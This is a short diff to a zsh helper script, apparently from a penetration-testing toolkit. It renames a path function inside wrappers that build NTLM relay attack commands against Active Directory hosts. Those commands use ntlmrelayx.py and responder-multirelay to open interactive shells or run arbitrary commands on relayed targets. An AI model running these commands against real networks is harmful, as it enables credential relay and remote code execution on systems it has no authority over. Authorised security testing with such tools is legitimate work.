@@ -40,7 +40,7 @@ nb-ad-smb-relay-ntlmrelay() {
 	  __ask "Enter a targets list file"
 	  local targets && __askvar targets TARGETS
 
-    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support | tee $(domadpath)/ntlmrelayx.txt"
+    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support | tee $(__domadpath)/ntlmrelayx.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay-shell() {
@@ -48,7 +48,7 @@ nb-ad-smb-relay-ntlmrelay-shell() {
 	  __ask "Enter a targets list file"
 	  local targets && __askvar targets TARGETS
 
-    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i | tee $(domadpath)/ntlmrelayx-shell.txt"
+    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i | tee $(__domadpath)/ntlmrelayx-shell.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay-command() {
@@ -57,7 +57,7 @@ nb-ad-smb-relay-ntlmrelay-command() {
 	  local targets && __askvar targets TARGETS
 	  local cm && __askvar cm COMMAND
 
-	  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c '$cm' | tee $(domadpath)/ntlmrelayx-command.txt"
+	  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c '$cm' | tee $(__domadpath)/ntlmrelayx-command.txt"
 }
 
 nb-ad-smb-relay-multirelay-command() {
@@ -67,5 +67,5 @@ nb-ad-smb-relay-multirelay-command() {
 	  __ask "Enter a shell command to execute"
 	  local command && __askvar command COMMAND
 
-	  print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL | tee $(domadpath)/responder-multirelay.txt"
+	  print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL | tee $(__domadpath)/responder-multirelay.txt"
 }
